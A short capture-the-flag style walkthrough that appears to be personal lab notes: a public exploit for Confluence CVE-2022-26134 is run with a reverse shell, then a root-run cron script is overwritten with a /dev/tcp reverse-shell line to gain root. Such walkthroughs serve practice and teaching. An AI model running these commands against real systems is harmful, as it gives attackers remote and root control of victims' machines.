#box

*Created: 1/10/2026*

### Step 1

**Tags:** #Common-Applications #Web-Applications #confluence #OGNL-Injection #RCE

🔗 **URL/Link:** https://github.com/jbaines-r7/through_the_wire

**Command:**
```bash
python3 through_the_wire.py --rhost 192.168.200.41 --rport 8090 --lhost 192.168.45.213 --lport 8090 --protocol http:// --reverse-shell
```

*Port: 8090*

> 
> This machine shows a Confluence instance on port 8090. It instantly shows up the version 7.13.6 of Confluence which is vulnerable to [CVE-2022-26134](https://github.com/jbaines-r7/through_the_wire). Using this CVE we gain access as the user `confluence` inside the target.

---

### Step 2

**Tags:** #cron #Linux #Reverse-Shell

**Command:**
```bash
echo '#!/bin/bash\n\nsh -i >& /dev/tcp/192.168.45.213/139 0>&1' > log-backup.sh
```

> 
> Once on the target machine, we discover a script called `/opt/backups.sh` which is owned by confluence but is ran by root every minute. Replacing that script with a reverse shell, since we own the file, will execute the script as root and give us a root shell.
> 
> The cronjob launching this script was triggered by a crontask in `/var/spool/cron/crontabs/root`.

---

